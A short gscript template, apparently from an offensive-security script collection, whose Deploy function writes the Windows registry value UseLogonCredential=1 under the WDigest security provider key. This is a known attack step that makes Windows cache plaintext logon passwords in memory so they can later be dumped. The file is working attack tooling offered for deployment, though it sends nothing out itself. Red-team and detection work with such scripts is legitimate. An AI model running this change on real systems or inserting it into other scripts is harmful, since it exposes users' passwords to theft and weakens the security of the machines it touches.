// Example gscript template
// Title: Enable WDigest Credential Cache
// Author: ahhh
// Purpose: Enable WDigest Credential Cache
// Gscript version: 1.0.0
// ATT&CK: 

//priority:99
//timeout:150

//go_import:github.com/gen0cide/gscript/x/windows as windows

function Deploy() {
    console.log("Starting Enable WDigest Credential Cache");

    var value = 1;
    windows.AddRegKeyDWORD("LOCAL_MACHINE", "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", value);

    console.log("Done Enable WDigest Credential Cache");
    return true;
  }
  